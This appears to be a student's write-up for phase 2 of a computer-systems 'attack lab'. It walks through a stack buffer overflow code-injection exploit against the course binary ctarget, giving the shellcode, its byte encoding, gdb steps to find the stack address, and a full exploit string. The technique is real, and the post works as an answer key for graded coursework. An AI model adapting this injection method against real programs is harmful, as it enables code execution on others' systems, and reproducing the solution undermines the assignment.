# Phase 2

In phase 2 we have to inject code and call touch2 with our cookie as argument.

My touch 2 looks like this:

```
00000000004018b5 <touch2>:
  4018b5:	48 83 ec 08          	sub    $0x8,%rsp
  4018b9:	89 fa                	mov    %edi,%edx
  4018bb:	c7 05 57 2c 20 00 02 	movl   $0x2,0x202c57(%rip)        # 60451c <vlevel>
  4018c2:	00 00 00 
  4018c5:	39 3d 59 2c 20 00    	cmp    %edi,0x202c59(%rip)        # 604524 <cookie>
  4018cb:	75 20                	jne    4018ed <touch2+0x38>
  4018cd:	be a8 31 40 00       	mov    $0x4031a8,%esi
  4018d2:	bf 01 00 00 00       	mov    $0x1,%edi
  4018d7:	b8 00 00 00 00       	mov    $0x0,%eax
  4018dc:	e8 1f f5 ff ff       	callq  400e00 <__printf_chk@plt>
  4018e1:	bf 02 00 00 00       	mov    $0x2,%edi
  4018e6:	e8 57 04 00 00       	callq  401d42 <validate>
  4018eb:	eb 1e                	jmp    40190b <touch2+0x56>
  4018ed:	be d0 31 40 00       	mov    $0x4031d0,%esi
  4018f2:	bf 01 00 00 00       	mov    $0x1,%edi
  4018f7:	b8 00 00 00 00       	mov    $0x0,%eax
  4018fc:	e8 ff f4 ff ff       	callq  400e00 <__printf_chk@plt>
  401901:	bf 02 00 00 00       	mov    $0x2,%edi
  401906:	e8 f9 04 00 00       	callq  401e04 <fail>
  40190b:	bf 00 00 00 00       	mov    $0x0,%edi
  401910:	e8 3b f5 ff ff       	callq  400e50 <exit@plt>
```

We have to modify the %rdi register and store our cookie in there.

So you have to write assembly code for that, I created a file called phase2.s and wrote code to move my cookie into `rdi`, and then I pushed the adress of touch2.

```
  movq $0x2d274378,%rdi /* move my cookie to register %rdi */
  pushq  $0x4018b5
  retq                  /* return */
```

Now we need the byte representation of the code you wrote above. Compile it with gcc then dissasemble it with the following lines of code on console:

```
gcc -c phase2.s
objdump -d phase2.o  > phase2.d 
```

The file phase2.d will have something like this:

```
phase2.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 78 43 27 2d 	mov    $0x2d274378,%rdi
   7:	68 b5 18 40 00       	pushq  $0x4018b5
   c:	c3                   	retq   
```

The byte representation of the assembly code is `48 c7 c7 78 43 27 2d 68 b5 18 40 00 c3`

Now we need to find the address of rsp register by running ctarget through gdb 

`gdb ctarget`

set a breakpoint at getbuf 

`b getbuf`

run ctarget

`r`

Now do 

`disas`
 
 You will get something like below (this doesn't match the above code as it is an updated version)
```
Dump of assembler code for function getbuf:
=> 0x0000000000401873 <+0>:     sub    $0x28,%rsp
   0x0000000000401877 <+4>:     mov    %rsp,%rdi
   0x000000000040187a <+7>:     callq  0x401afd <Gets>
   0x000000000040187f <+12>:    mov    $0x1,%eax
   0x0000000000401884 <+17>:    add    $0x28,%rsp
   0x0000000000401888 <+21>:    retq   
End of assembler dump.

```

Now we need to run the code until the instruction just below `callq  0x401afd <Gets>` so you will do something like

`until *0x40187a` 

Then it will ask you type a string...type a string longer than the buffer(40 characters in this case). After that do

`x/s $rsp` 

You will get something like

```
(gdb) x/s $rsp
0x5567e588:	"ldsjfsdkfjdslfadjhdfkajfadlkfjakldjfpqienzjkjsdlkfjsdlkfjsldkfjsldkjf" 
```
The address on the left side is what we want. `0x5567e588`

Now, we create a text file named phase2.txt which will look something like below:
Remember the reverse order of the adress.

```
48 c7 c7 78 43 27 2d 68 /*Moves my cookie*/
b5 18 40 00 c3 00 00 00 /*Pushes touch2 adress and returns*/
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /*My bytes of padding for the buffer*/
00 00 00 00 00 00 00 00
88 e5 67 55 00 00 00 00 /*address of %rsp*/

```

We run it through hex2raw

`./hex2raw < phase2.txt > raw-phase2.txt`

And run the raw file

`./ctarget < raw-phase2.txt`

The final resutl will be something like this

```
Cookie: 0x2d274378
Type string:Touch2!: You called touch2(0x2d274378)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!

```
